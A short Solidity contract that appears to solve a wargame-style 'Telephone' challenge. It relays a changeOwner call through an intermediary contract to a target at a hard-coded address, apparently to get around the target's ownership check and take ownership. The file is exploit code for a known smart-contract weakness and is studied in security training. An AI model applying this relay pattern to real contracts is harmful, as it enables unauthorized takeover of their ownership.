pragma solidity ^0.4.24;

contract TelephoneInterface {
   function changeOwner(address _owner) public;
}

contract Telephone{
   TelephoneInterface tel;

   constructor() public {
       tel = TelephoneInterface(0x6c2fe7e15aad566ae65dcf56324b054a5d4733ba);
   }

   function sendMessage(address owner) public {
       tel.changeOwner(owner);
   }
}